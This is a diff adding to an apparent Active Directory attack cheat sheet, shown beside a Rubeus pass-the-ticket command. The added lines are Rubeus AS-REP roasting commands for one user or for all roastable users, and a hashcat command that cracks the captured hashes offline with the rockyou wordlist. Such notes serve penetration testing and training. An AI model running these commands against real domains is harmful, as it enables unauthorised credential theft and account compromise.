@@ -60,6 +60,32 @@ Importing Converted Ticket into Windows Session with Rubeus:
  C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
 ```
 
+Retrieving AS-REP in Proper Format using Rubeus
+
+```powershell
+
+.\Rubeus.exe asreproast /user:$user /nowrap /format:hashcat
+# Example:
+# .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+```
+
+Or for all roastable users
+
+
+
+```powershell
+# Retrieving AS-REP in Proper Format using Rubeus
+.\Rubeus.exe asreproast /nowrap /format:hashcat
+```
+
+
+
+Cracking the Hash Offline with Hashcat:
+
+```bash
+hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
+```
+
 
 ## Evasion techniques
 
